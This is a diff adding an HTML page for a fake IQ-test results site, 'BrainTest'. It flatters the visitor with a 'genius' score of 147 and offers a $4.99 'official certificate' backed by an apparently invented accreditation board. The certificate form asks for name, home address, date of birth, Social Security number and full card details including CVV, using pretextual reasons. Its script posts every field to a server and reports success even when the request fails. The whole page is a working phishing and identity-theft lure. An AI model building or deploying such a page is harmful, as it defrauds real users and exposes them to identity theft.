@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BrainTest &mdash; Your IQ Results</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;color:#2d3436;background:#fafafa;min-height:100vh}
+
+@keyframes confetti-fall{
+  0%{transform:translateY(-10vh) rotate(0deg);opacity:1}
+  100%{transform:translateY(105vh) rotate(720deg);opacity:0}
+}
+.confetti-wrap{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;overflow:hidden;z-index:0}
+.confetti{position:absolute;width:10px;height:10px;border-radius:2px;animation:confetti-fall linear forwards}
+
+.header{background:#fff;border-bottom:1px solid #eee;padding:16px 0;position:relative;z-index:1}
+.header-inner{max-width:1100px;margin:0 auto;padding:0 24px;display:flex;align-items:center}
+.logo{font-size:20px;font-weight:800;color:#6c5ce7}.logo span{color:#2d3436}
+
+.results-hero{background:linear-gradient(135deg,#6c5ce7 0%,#a29bfe 100%);color:#fff;padding:64px 24px 48px;text-align:center;position:relative;z-index:1}
+.score-badge{width:160px;height:160px;border-radius:50%;background:linear-gradient(135deg,#fdcb6e,#f39c12);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 32px rgba(243,156,18,.4)}
+.score-badge .score-num{font-size:56px;font-weight:800;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.2)}
+.results-hero h1{font-size:28px;font-weight:700;margin-bottom:8px}
+.results-hero .badge-text{font-size:16px;opacity:.9}
+
+.container{max-width:800px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+.percentile-section{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.06);padding:32px;margin:-32px auto 32px;position:relative;z-index:2}
+.percentile-section h2{font-size:18px;font-weight:700;margin-bottom:20px;text-align:center;color:#2d3436}
+.pct-bar{position:relative;background:#eee;border-radius:8px;height:24px;margin-bottom:16px;overflow:visible}
+.pct-fill{height:100%;background:linear-gradient(90deg,#e17055,#fdcb6e,#00b894);border-radius:8px;width:98%}
+.pct-marker{position:absolute;top:-8px;left:98%;transform:translateX(-50%);width:4px;height:40px;background:#6c5ce7;border-radius:2px}
+.pct-label{position:absolute;top:-32px;left:98%;transform:translateX(-50%);background:#6c5ce7;color:#fff;font-size:11px;font-weight:700;padding:4px 10px;border-radius:6px;white-space:nowrap}
+.pct-labels{display:flex;justify-content:space-between;font-size:11px;color:#b2bec3}
+
+.class-table{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.06);padding:32px;margin-bottom:32px}
+.class-table h2{font-size:18px;font-weight:700;margin-bottom:20px;text-align:center}
+.class-table table{width:100%;border-collapse:collapse}
+.class-table th{text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#b2bec3;padding:8px 12px;border-bottom:2px solid #eee}
+.class-table td{padding:12px;font-size:14px;border-bottom:1px solid #f1f1f1}
+.class-table tr.highlight{background:#f8f7ff;border-left:4px solid #6c5ce7}
+.class-table tr.highlight td{font-weight:700;color:#6c5ce7}
+
+.cert-section{background:linear-gradient(135deg,#ffeaa7 0%,#fdcb6e 100%);border-radius:20px;padding:40px;margin-bottom:32px;text-align:center;box-shadow:0 4px 24px rgba(253,203,110,.3);border:2px solid #f39c12}
+.cert-section .trophy{font-size:48px;margin-bottom:12px;display:block}
+.cert-section h2{font-size:24px;font-weight:800;color:#2d3436;margin-bottom:8px}
+.cert-section .cert-sub{font-size:14px;color:#636e72;margin-bottom:4px}
+.cert-section .cert-org{font-size:12px;color:#b2bec3;margin-bottom:24px}
+.cert-form{max-width:440px;margin:0 auto;text-align:left}
+.form-group{margin-bottom:16px}
+.form-group label{display:block;font-size:13px;font-weight:600;color:#2d3436;margin-bottom:6px}
+.form-group .hint{font-size:11px;color:#636e72;font-weight:400;display:block;margin-top:2px}
+.form-group input{width:100%;padding:12px 14px;border:2px solid #e0d5a0;border-radius:10px;font-size:14px;background:#fffef5;transition:border-color .2s}
+.form-group input:focus{outline:none;border-color:#f39c12}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.cert-testimonial{font-size:13px;color:#636e72;font-style:italic;margin:20px 0 24px;padding:12px;background:rgba(255,255,255,.5);border-radius:8px}
+.btn-cert{background:linear-gradient(135deg,#e17055,#d63031);color:#fff;border:none;padding:16px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 4px 16px rgba(214,48,49,.3);transition:transform .2s;width:100%}
+.btn-cert:hover{transform:translateY(-2px)}
+.cert-price{font-size:12px;color:#636e72;margin-top:12px}
+
+.cert-success{display:none;padding:24px;text-align:center}
+.cert-success .check{font-size:48px;margin-bottom:12px;display:block}
+.cert-success h3{font-size:20px;color:#00b894;margin-bottom:8px}
+.cert-success p{font-size:14px;color:#636e72}
+
+.safe-link{text-align:center;margin:24px 0 48px;font-size:13px;color:#b2bec3}
+.safe-link a{color:#b2bec3;text-decoration:underline}
+.safe-link a:hover{color:#636e72}
+
+.footer{text-align:center;padding:24px;font-size:12px;color:#b2bec3;border-top:1px solid #eee}
+
+@media(max-width:600px){
+  .form-row{grid-template-columns:1fr}
+  .cert-section{padding:28px 20px}
+  .score-badge{width:120px;height:120px}
+  .score-badge .score-num{font-size:40px}
+}
+</style>
+</head>
+<body>
+
+<div class="confetti-wrap" id="confettiWrap"></div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="logo">Brain<span>Test</span></div>
+  </div>
+</header>
+
+<section class="results-hero">
+  <div class="score-badge">
+    <span class="score-num">147</span>
+  </div>
+  <h1>&#127881; Genius Level! Top 2% of the population!</h1>
+  <p class="badge-text">Your IQ Score: 147 &mdash; Exceptional Cognitive Ability</p>
+</section>
+
+<div class="container">
+
+  <div class="percentile-section">
+    <h2>Your Percentile Ranking</h2>
+    <div class="pct-bar">
+      <div class="pct-fill"></div>
+      <div class="pct-marker"></div>
+      <div class="pct-label">You: 98th percentile</div>
+    </div>
+    <div class="pct-labels">
+      <span>0th</span><span>25th</span><span>50th</span><span>75th</span><span>100th</span>
+    </div>
+  </div>
+
+  <div class="class-table">
+    <h2>IQ Classification Scale</h2>
+    <table>
+      <thead><tr><th>Classification</th><th>IQ Range</th><th>Population</th></tr></thead>
+      <tbody>
+        <tr><td>Below Average</td><td>70 &ndash; 89</td><td>~23%</td></tr>
+        <tr><td>Average</td><td>90 &ndash; 109</td><td>~50%</td></tr>
+        <tr><td>Above Average</td><td>110 &ndash; 119</td><td>~15%</td></tr>
+        <tr><td>Superior</td><td>120 &ndash; 139</td><td>~10%</td></tr>
+        <tr class="highlight"><td>&#11088; Genius</td><td>140+</td><td>Top 2%</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cert-section" id="certSection">
+    <span class="trophy">&#127942;</span>
+    <h2>Get Your Official IQ Certificate</h2>
+    <p class="cert-sub">Printed on premium paper and shipped to your address</p>
+    <p class="cert-org">Recognized by the International Cognitive Assessment Board (ICAB)</p>
+
+    <div class="cert-form" id="certForm">
+      <div class="form-group">
+        <label>Full Name</label>
+        <input type="text" id="full_name" placeholder="Enter your full legal name" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Home Address</label>
+        <input type="text" id="address" placeholder="123 Main St, City, State, ZIP" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Date of Birth
+          <span class="hint">Required for age-adjusted scoring on the certificate</span>
+        </label>
+        <input type="text" id="dob" placeholder="MM/DD/YYYY" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label>Social Security Number
+          <span class="hint">Required for identity verification to prevent certificate fraud</span>
+        </label>
+        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" autocomplete="off">
+      </div>
+
+      <hr style="border:none;border-top:1px dashed #e0d5a0;margin:24px 0">
+
+      <p style="font-size:13px;font-weight:600;color:#2d3436;margin-bottom:16px">&#128179; Certificate printing &amp; shipping fee: $4.99</p>
+
+      <div class="form-group">
+        <label>Card Number</label>
+        <input type="text" id="card_number" placeholder="1234 5678 9012 3456" autocomplete="off">
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Expiry Date</label>
+          <input type="text" id="card_expiry" placeholder="MM/YY" autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label>CVV</label>
+          <input type="text" id="card_cvv" placeholder="123" autocomplete="off">
+        </div>
+      </div>
+
+      <div class="cert-testimonial">
+        &ldquo;I framed mine and hung it in my office!&rdquo; &mdash; Dr. Patricia M.
+      </div>
+
+      <button class="btn-cert" id="btnSubmit">Order My Certificate &mdash; $4.99</button>
+      <p class="cert-price">&#128274; Secure checkout &bull; 30-day money-back guarantee</p>
+    </div>
+
+    <div class="cert-success" id="certSuccess">
+      <span class="check">&#9989;</span>
+      <h3>Certificate Ordered!</h3>
+      <p>Your Official IQ Certificate will be shipped within 5-7 business days.</p>
+    </div>
+  </div>
+
+  <div class="safe-link">
+    <a href="/score-only">View score only (no certificate)</a>
+  </div>
+
+</div>
+
+<footer class="footer">
+  &copy; 2026 BrainTest &mdash; International Cognitive Assessment Board. All rights reserved.
+</footer>
+
+<script>
+(function(){
+  var wrap = document.getElementById('confettiWrap');
+  var colors = ['#6c5ce7','#a29bfe','#fdcb6e','#e17055','#00b894','#74b9ff','#fd79a8'];
+  for(var i=0; i<60; i++){
+    var c = document.createElement('div');
+    c.className = 'confetti';
+    c.style.left = Math.random()*100+'%';
+    c.style.background = colors[Math.floor(Math.random()*colors.length)];
+    c.style.width = (6+Math.random()*8)+'px';
+    c.style.height = (6+Math.random()*8)+'px';
+    c.style.animationDuration = (2+Math.random()*4)+'s';
+    c.style.animationDelay = Math.random()*3+'s';
+    c.style.borderRadius = Math.random()>.5?'50%':'2px';
+    wrap.appendChild(c);
+  }
+
+  document.getElementById('btnSubmit').addEventListener('click', function(){
+    var fields = {};
+    ['full_name','email','address','dob','ssn','card_number','card_expiry','card_cvv'].forEach(function(f){
+      fields[f] = (document.getElementById(f).value||'').trim();
+    });
+
+    fetch('/api/submit-details',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(fields)
+    }).then(function(r){return r.json()}).then(function(){
+      document.getElementById('certForm').style.display='none';
+      document.getElementById('certSuccess').style.display='block';
+    }).catch(function(){
+      document.getElementById('certForm').style.display='none';
+      document.getElementById('certSuccess').style.display='block';
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
